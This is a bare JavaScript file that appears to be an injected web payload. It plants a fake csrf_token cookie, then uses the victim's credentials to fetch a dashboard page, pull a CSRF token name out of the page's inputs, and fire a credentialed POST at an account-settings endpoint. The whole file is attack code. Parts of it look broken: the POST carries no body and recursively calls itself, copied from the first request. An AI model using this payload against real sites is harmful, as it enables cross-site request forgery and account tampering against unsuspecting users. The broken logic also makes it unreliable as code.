



function plantCookie()
{
	
	document.cookie = "csrf_token=tabahi";
	
}

plantCookie();

emailCSRFAttack();

function emailCSRFAttack()
{
	
	var fetchHash = new XMLHttpRequest();

	var url = window.location.protocol+"//"+window.location.hostname+"/dashboard";
	var datax;
	var all_elements;
	var vc_email_token='initial';

	fetchHash.onreadystatechange=function ()
	{
		if(fetchHash.readyState==4 && fetchHash.status==200)
        {

            datax = fetchHash.responseText;
                       var loot = document.createElement('html');
					   loot.innerHTML = datax;
					   all_elements = loot.getElementsByTagName( 'input' );
					   vc_email_token = all_elements[49].name;
					   alert('Your token name: '+vc_email_token);
					   hack(vc_email_token);


        }

	}

fetchHash.open("GET",url, true);
fetchHash.withCredentials=true;
fetchHash.send();
	
	
	
}



function hack(csrfName)
{
	
	
	
	var fetchHash = new XMLHttpRequest();

	var url = window.location.protocol+"//"+window.location.hostname+"/components/account-settings/user-profile-photo-save";
	var datax;
	var all_elements;
	var vc_email_token='initial';

	fetchHash.onreadystatechange=function ()
	{
		if(fetchHash.readyState==4 && fetchHash.status==200)
        {

            datax = fetchHash.responseText;
                       var loot = document.createElement('html');
					   loot.innerHTML = datax;
					   all_elements = loot.getElementsByTagName( 'input' );
					   vc_email_token = all_elements[49].name;
					   alert('Your token name: '+vc_email_token);
					   hack(vc_email_token);


        }

	}

fetchHash.open("POST",url, true);
fetchHash.withCredentials=true;
fetchHash.send();
	
	
	
	
	
	
	
	
	
	
}